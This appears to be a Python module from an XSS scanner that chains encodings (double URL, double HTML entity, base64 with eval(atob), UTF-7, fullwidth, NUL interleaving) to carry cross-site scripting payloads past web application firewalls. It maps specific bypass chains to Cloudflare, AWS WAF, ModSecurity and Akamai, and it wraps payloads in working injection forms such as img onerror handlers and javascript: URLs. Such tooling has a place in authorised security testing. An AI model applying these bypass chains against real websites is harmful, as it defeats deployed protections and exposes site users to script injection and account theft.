"""Multi-encoding chains (Phase 13c).

Many WAFs and application-layer filters decode specific encodings before
inspecting the request:

  * AWS WAF and Cloudflare URL-decode once, so single URL-encoding is
    stripped but DOUBLE URL-encoding survives (the second ``%25`` decodes
    to ``%``, which the application then decodes again).
  * ASP.NET request validation HTML-decodes once, so HTML entities in the
    query string are decoded before the XSS filter sees them -- but
    DOUBLE HTML-entity-encoding (``&amp;lt;`` -> ``&lt;`` -> ``<``) survives.
  * Some PHP applications running ``htmlentities()`` with the default
    ``ENT_QUOTES`` flag will strip single-quote entities (``&#39;``) but
    NOT hex entities (``&#x27;``).
  * Browsers decode HTML entities in attributes/URLs but NOT in JavaScript
    string literals -- so an HTML-entity-encoded payload executes in HTML
    contexts but is inert (safe) inside ``<script>`` blocks.
  * Base64 + ``eval(atob(...))`` lets a payload travel as pure base64
    (no ``<``, ``>``, ``"``, ``'`` chars at all) and decode at runtime.

A multi-encoding chain applies SEVERAL encodings in sequence so the
payload survives each decoding layer the WAF/application applies.  The
chain's "decode order" must match the application's decode order, which
is typically:

    request received
      -> WAF URL-decodes once
      -> application URL-decodes again (double-encoding bypass)
      -> application HTML-decodes once
      -> application reflects the value into HTML/JS/CSS context
      -> browser parses the HTML/JS/CSS and executes

This module produces chains that match this real-world decode order.

Each chain is (name, [encoding_steps], why_it_works).  The scanner picks
chains based on the detected WAF and reflection context.
"""
from __future__ import annotations
import base64
import re
from urllib.parse import quote

from . import transform as _t


# ---------------------------------------------------------------------------
# Single-encoding primitives (re-used from transform.py where possible)
# ---------------------------------------------------------------------------

def enc_url_once(s: str) -> str:
    """Single URL-encode: ``<`` -> ``%3C``."""
    return quote(s, safe="")


def enc_url_twice(s: str) -> str:
    """Double URL-encode: ``<`` -> ``%3C`` -> ``%253C``.
    Survives WAFs that URL-decode once before inspection."""
    return enc_url_once(enc_url_once(s))


def enc_html_decimal(s: str) -> str:
    """HTML decimal entity: ``<`` -> ``&#60;``."""
    return _t.t_html_entity_decimal(s)


def enc_html_hex(s: str) -> str:
    """HTML hex entity: ``<`` -> ``&#x3C;``."""
    return _t.t_html_entity_hex(s)


def enc_html_named(s: str) -> str:
    """HTML named entity: ``<`` -> ``&lt;``."""
    return _t.t_html_entity_named(s)


def enc_html_named_double(s: str) -> str:
    """Double HTML-named-entity: ``<`` -> ``&lt;`` -> ``&amp;lt;``.
    Survives applications that HTML-decode once before reflecting."""
    return enc_html_named(enc_html_named(s))


def enc_html5_named(s: str) -> str:
    """HTML5 named entity: ``<`` -> ``&lt;`` but uses less common names
    like ``&sol;`` for ``/``, ``&colon;`` for ``:``, ``&lpar;`` for ``(``."""
    return _t.t_html5_entities(s)


def enc_js_unicode(s: str) -> str:
    """JS unicode escape: ``<`` -> ``\\u003C``.  Decoded by the JS engine
    inside script blocks / string literals but inert in raw HTML text."""
    return _t.t_js_unicode(s)


def enc_js_hex(s: str) -> str:
    """JS hex escape: ``<`` -> ``\\x3C``.  Same context as ``enc_js_unicode``
    but shorter (1 byte chars only)."""
    return "".join(f"\\x{ord(c):02X}" for c in s)


def enc_css_unicode(s: str) -> str:
    """CSS unicode escape: ``<`` -> ``\\3C``.  Decoded by the CSS engine
    inside style= attributes / <style> blocks."""
    return _t.t_css_unicode(s)


def enc_base64(s: str) -> str:
    """Base64-encode the payload.  Useful when wrapped in ``eval(atob(...))``
    so the payload contains no XSS-signature chars at all."""
    return base64.b64encode(s.encode("utf-8", "replace")).decode("ascii")


def enc_utf7(s: str) -> str:
    """UTF-7 encode: ``<`` -> ``+ADw-``.  Old parsers that treat the page
    as UTF-7 (often via a reflected charset) decode this back to XSS."""
    return _t.t_utf7(s)


def enc_fullwidth(s: str) -> str:
    """Fullwidth Unicode: ``<`` -> ``＜``.  Some parsers normalize
    fullwidth forms back to ASCII before reflection."""
    return _t.t_fullwidth(s)


def enc_mixed_case(s: str) -> str:
    """Mixed-case tag/attribute names.  HTML is case-insensitive, so
    ``<ScRiPt>`` parses identically to ``<script>`` but bypasses
    case-sensitive filters."""
    return _t.t_mixed_case(s)


def enc_comment_break(s: str) -> str:
    """Insert JS comments inside keywords: ``script`` -> ``scr/**/ipt``.
    JS comments are stripped by the JS engine but not by string-matching
    WAFs."""
    return _t.t_comment_break(s)


def enc_null_interleave(s: str) -> str:
    """Interleave NUL bytes between characters.  Some parsers strip NULs
    before parsing, so the payload re-assembles on the far side."""
    return _t.t_interleave_nulls(s)


# Registry of single encoders, keyed by name.  Each entry is
# (name, function, decode_layer) where decode_layer describes which
# layer of the request-response pipeline decodes this encoding.
_ENCODERS: list[tuple[str, callable, str]] = [
    ("url_once",        enc_url_once,         "WAF URL-decode"),
    ("url_twice",       enc_url_twice,        "application URL-decode"),
    ("html_decimal",    enc_html_decimal,     "browser HTML parse"),
    ("html_hex",        enc_html_hex,         "browser HTML parse"),
    ("html_named",      enc_html_named,       "browser HTML parse"),
    ("html_named_double", enc_html_named_double, "double HTML-decode app"),
    ("html5_named",     enc_html5_named,      "browser HTML5 parse"),
    ("js_unicode",      enc_js_unicode,       "JS engine parse"),
    ("js_hex",          enc_js_hex,           "JS engine parse"),
    ("css_unicode",     enc_css_unicode,      "CSS engine parse"),
    ("base64",          enc_base64,           "eval(atob(...))"),
    ("utf7",            enc_utf7,             "UTF-7 charset parser"),
    ("fullwidth",       enc_fullwidth,        "Unicode normalization"),
    ("mixed_case",      enc_mixed_case,       "HTML case-insensitivity"),
    ("comment_break",   enc_comment_break,    "JS comment stripping"),
    ("null_interleave", enc_null_interleave,  "NUL stripping"),
]


# ---------------------------------------------------------------------------
# Multi-encoding chains
# ---------------------------------------------------------------------------

# Each chain: (name, [encoder_steps], why_it_works, recommended_contexts).
# ``recommended_contexts`` is a list of reflection context names where the
# chain is most likely to succeed; ``None`` means "any context".
MULTI_ENCODE_CHAINS: list[tuple[str, list[str], str, list[str] | None]] = [
    # --- Double URL-encoding chains (survive single-decode WAFs) ---
    ("double_url_html",
     ["url_twice", "html_named"],
     "Double URL-encode + HTML named entity. Survives: WAF URL-decode -> "
     "app URL-decode -> app HTML-decode -> browser HTML parse.",
     ["html_element", "html_attribute_dq", "html_attribute_sq"]),

    ("double_url_js_unicode",
     ["url_twice", "js_unicode"],
     "Double URL-encode + JS unicode escape. Survives WAF URL-decode + "
     "app URL-decode, then JS engine decodes \\uXXXX.",
     ["script_string_dq", "script_string_sq", "script_block"]),

    ("double_url_css",
     ["url_twice", "css_unicode"],
     "Double URL-encode + CSS unicode escape. For style-context reflection.",
     ["style_block", "style_string_dq", "style_string_sq", "css"]),

    # --- Double HTML-entity chains (survive single HTML-decode apps) ---
    ("double_html_named",
     ["html_named_double"],
     "Double HTML-named-entity. App HTML-decodes once -> &lt; survives -> "
     "browser HTML-decodes again -> < executes.",
     ["html_element", "html_attribute_dq"]),

    ("double_html_hex",
     ["html_named", "html_hex"],
     "HTML named entity + hex entity layered. Defeats filters that strip "
     "named entities but not hex entities (and vice versa).",
     ["html_element", "html_attribute_dq", "url_href"]),

    # --- Base64 + eval chains (no XSS-signature chars at all) ---
    ("base64_eval_script",
     ["base64"],
     "Base64-encode the payload; wrap in <script>eval(atob('...'))</script>. "
     "The base64 string contains no <, >, \", ' chars so it bypasses nearly "
     "all signature-based WAFs.",
     ["script_block", "script_string_dq", "script_string_sq"]),

    ("base64_eval_event",
     ["base64"],
     "Base64-encode the payload; wrap in <img onerror=eval(atob('...'))>. "
     "For HTML-element reflection where <script> is blocked.",
     ["html_element"]),

    # --- UTF-7 chains (legacy but still effective on misconfigured servers) ---
    ("utf7_chain",
     ["utf7"],
     "UTF-7 encoding. Effective when the server reflects a charset value "
     "and the browser treats the page as UTF-7 (classic charset-injection).",
     ["html_element", "html_attribute_dq"]),

    # --- Fullwidth chains (Unicode normalization bypass) ---
    ("fullwidth_mixed_case",
     ["fullwidth", "mixed_case"],
     "Fullwidth Unicode + mixed case. Bypasses ASCII-only signature WAFs "
     "that don't normalize fullwidth forms.",
     ["html_element", "html_attribute_dq"]),

    # --- JS-context-specific chains ---
    ("js_unicode_comment_break",
     ["js_unicode", "comment_break"],
     "JS unicode escape + JS comment break. For script-string reflection: "
     "the JS engine decodes \\uXXXX and strips /**/ comments.",
     ["script_string_dq", "script_string_sq", "script_block"]),

    ("js_hex_concat",
     ["js_hex"],
     "JS hex escape with string concatenation. Replaces alert(1) with "
     "\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29 -- pure hex, no keyword.",
     ["script_string_dq", "script_string_sq"]),

    # --- CSS-context chains ---
    ("css_unicode_expression",
     ["css_unicode"],
     "CSS unicode escape. For style= attribute reflection: the CSS engine "
     "decodes \\XX sequences.",
     ["style_string_dq", "style_string_sq", "css"]),

    # --- Triple-encoding chains (maximum evasion, longer payload) ---
    ("triple_url_html_js",
     ["url_twice", "html_named", "js_unicode"],
     "Triple encode: URL x2 + HTML named + JS unicode. Survives the "
     "deepest decode stacks (WAF URL-decode + app URL-decode + app "
     "HTML-decode + JS engine parse). Payload is long; use only when "
     "simpler chains fail.",
     ["script_string_dq", "script_string_sq"]),

    ("triple_url_html_css",
     ["url_twice", "html_named", "css_unicode"],
     "Triple encode for CSS context: URL x2 + HTML named + CSS unicode.",
     ["style_string_dq", "style_string_sq", "css"]),

    # --- Null-byte chains (legacy IE/Edge parser quirks) ---
    ("null_interleave_mixed",
     ["null_interleave", "mixed_case"],
     "NUL interleave + mixed case. Old IE/Edge parsers strip NULs before "
     "parsing, re-assembling the payload on the far side.",
     ["html_element", "html_attribute_dq"]),

    # --- HTML5 named entity chains (rare entities WAFs don't know) ---
    ("html5_named_chain",
     ["html5_named"],
     "HTML5 named entities (&sol; &colon; &lpar; &rpar;). Many WAFs only "
     "know the legacy HTML4 entities (&lt; &gt; &amp;) and miss these.",
     ["html_element", "html_attribute_dq", "url_href"]),
]


# ---------------------------------------------------------------------------
# Wrapping helpers for base64 chains (the raw base64 string alone doesn't
# execute -- it must be wrapped in an eval(atob(...)) call).
# ---------------------------------------------------------------------------

def _wrap_base64_payload(payload: str, context: str | None = None) -> str:
    """Wrap a payload in an eval(atob(...)) call appropriate for the context.

    For script contexts: ``eval(atob('...'))``
    For HTML element contexts: ``<img src=x onerror=eval(atob('...'))>``
    For attribute contexts: ``" onerror="eval(atob('...'))"``
    """
    b64 = enc_base64(payload)
    if context in ("script_block", "script_string_dq", "script_string_sq",
                   "script_string_bt"):
        return f"eval(atob('{b64}'))"
    if context in ("html_element", None):
        return f"<img src=x onerror=eval(atob('{b64}'))>"
    if context in ("html_attribute_dq", "html_attribute_sq"):
        return f'" onerror="eval(atob(\'{b64}\'))" x="'
    if context in ("url_href", "url_javascript"):
        return f"javascript:eval(atob('{b64}'))"
    # Default: HTML element wrapper.
    return f"<img src=x onerror=eval(atob('{b64}'))>"


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def apply_chain(payload: str, chain: list[str],
                context: str | None = None) -> str:
    """Apply a multi-encoding chain to a payload.

    Args:
        payload: the base payload to encode.
        chain: list of encoder names (from ``MULTI_ENCODE_CHAINS``).
        context: optional reflection context, used to pick the right
                 wrapper for base64 chains.

    Returns: the encoded payload string.
    """
    # Special case: if the chain is just ["base64"], wrap the payload
    # in eval(atob(...)) appropriate for the context.
    if chain == ["base64"]:
        return _wrap_base64_payload(payload, context)

    out = payload
    for step in chain:
        fn = _encoder_by_name(step)
        if fn is None:
            continue
        try:
            out = fn(out)
        except Exception:
            continue
    return out


def _encoder_by_name(name: str) -> callable | None:
    """Look up an encoder function by name."""
    for n, fn, _ in _ENCODERS:
        if n == name:
            return fn
    return None


def chains_for_context(context: str) -> list[tuple[str, list[str], str]]:
    """Return all chains whose recommended contexts include ``context``,
    plus all context-agnostic chains (recommended_contexts is None)."""
    out = []
    for name, steps, why, ctxs in MULTI_ENCODE_CHAINS:
        if ctxs is None or context in ctxs:
            out.append((name, steps, why))
    return out


def chains_for_waf(waf_name: str | None) -> list[tuple[str, list[str], str]]:
    """Return chains recommended for a specific WAF.

    Mapping is heuristic based on known WAF decode behavior:
      * Cloudflare / AWS WAF: URL-decode once -> double URL-encoding works.
      * ModSecurity: HTML-decode once -> double HTML entities work.
      * Akamai: case-sensitive -> mixed_case + fullwidth works.
      * Generic: try all chains; the scanner stops at the first success.
    """
    if not waf_name:
        # Generic: return a representative spread.
        return [
            (name, steps, why)
            for name, steps, why, _ in MULTI_ENCODE_CHAINS[:8]
        ]
    waf_lower = waf_name.lower()
    if "cloudflare" in waf_lower or "aws" in waf_lower:
        # These WAFs URL-decode once; double-URL chains bypass.
        return [
            ("double_url_html", ["url_twice", "html_named"],
             "Cloudflare/AWS URL-decode once; double-URL bypasses."),
            ("double_url_js_unicode", ["url_twice", "js_unicode"],
             "Double-URL + JS unicode for script contexts."),
            ("base64_eval_event", ["base64"],
             "Base64 + eval(atob) for HTML-element reflection."),
            ("fullwidth_mixed_case", ["fullwidth", "mixed_case"],
             "Fullwidth + mixed case for ASCII-only signatures."),
        ]
    if "modsecurity" in waf_lower or "crs" in waf_lower:
        # ModSecurity HTML-decodes once; double-HTML chains bypass.
        return [
            ("double_html_named", ["html_named_double"],
             "ModSecurity HTML-decodes once; double-HTML bypasses."),
            ("double_html_hex", ["html_named", "html_hex"],
             "Layered HTML entities: named + hex."),
            ("base64_eval_event", ["base64"],
             "Base64 + eval(atob) -- no signature chars at all."),
            ("js_unicode_comment_break", ["js_unicode", "comment_break"],
             "JS unicode + comment break for script contexts."),
        ]
    if "akamai" in waf_lower:
        return [
            ("fullwidth_mixed_case", ["fullwidth", "mixed_case"],
             "Akamai case-sensitive; fullwidth + mixed case bypasses."),
            ("base64_eval_event", ["base64"],
             "Base64 + eval(atob) bypasses ASCII signatures."),
            ("double_url_html", ["url_twice", "html_named"],
             "Double-URL + HTML entities."),
        ]
    # Default: generic spread.
    return [(name, steps, why) for name, steps, why, _ in MULTI_ENCODE_CHAINS[:8]]


def best_chain_for_context(context: str,
                           waf_name: str | None = None) -> tuple[str, list[str], str] | None:
    """Return the single best chain for the given context + WAF, or None.

    Prefers WAF-specific chains when a WAF is known; otherwise picks the
    first context-appropriate chain.
    """
    if waf_name:
        chains = chains_for_waf(waf_name)
        if chains:
            return chains[0]
    chains = chains_for_context(context)
    return chains[0] if chains else None


def all_chain_variants(payload: str,
                       context: str,
                       waf_name: str | None = None,
                       max_variants: int = 8) -> list[tuple[str, list[str], str]]:
    """Return a list of (chain_name, chain_steps, encoded_payload) variants.

    The scanner iterates this list and tries each encoded variant until
    one bypasses the filter and confirms execution.
    """
    out: list[tuple[str, list[str], str]] = []
    # WAF-specific chains first (higher yield when WAF is known).
    if waf_name:
        for name, steps, why in chains_for_waf(waf_name):
            try:
                variant = apply_chain(payload, steps, context)
                out.append((name, steps, variant))
            except Exception:
                continue
            if len(out) >= max_variants:
                return out
    # Then context-specific chains.
    for name, steps, why in chains_for_context(context):
        if any(n == name for n, _, _ in out):
            continue  # dedupe by chain name
        try:
            variant = apply_chain(payload, steps, context)
            out.append((name, steps, variant))
        except Exception:
            continue
        if len(out) >= max_variants:
            break
    return out


def supported_encoders() -> list[str]:
    """Return the list of encoder names."""
    return [n for n, _, _ in _ENCODERS]


def supported_chains() -> list[str]:
    """Return the list of chain names."""
    return [name for name, _, _, _ in MULTI_ENCODE_CHAINS]
